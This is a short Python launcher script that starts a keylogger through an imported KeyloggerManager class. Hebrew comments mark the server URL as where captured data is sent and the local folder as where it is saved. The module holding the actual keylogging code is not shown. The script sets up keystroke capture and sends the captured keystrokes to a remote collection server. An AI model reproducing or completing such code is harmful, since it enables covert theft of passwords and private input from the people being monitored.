from keylogger_manager import KeyloggerManager

if __name__ == "__main__":
    manager = KeyloggerManager(
        key="12345",
        server_url="http://192.168.1.100:8000/log",  # כתובת המחשב/שרת שאליו לשלוח
        local_save_dir=r"C:\KeyloggerLogs"           # תיקייה מקומית על המחשב שמקבל את הנתונים
    )
    manager.start()
